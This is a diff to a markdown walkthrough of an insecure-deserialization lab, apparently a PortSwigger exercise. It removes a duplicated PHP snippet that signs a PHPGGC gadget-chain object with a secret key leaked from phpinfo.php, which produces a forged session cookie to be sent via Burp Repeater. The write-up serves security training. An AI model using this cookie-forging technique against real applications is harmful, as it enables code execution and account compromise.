@@ -286,13 +286,6 @@ echo $cookie;
 7. Construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
     - Assign the object you generated in PHPGGC to the `$object` variable.
     - Assign the secret key that you copied from the `phpinfo.php` file to the `$secretKey` variable.
-```php 
-<?php
-$object = "OBJECT-GENERATED-BY-PHPGGC";
-$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
-$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
-echo $cookie;
-```
 ![](Pasted%20image%2020250328012049.png)
 8. In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab.
 	![](Pasted%20image%2020250328012113.png)
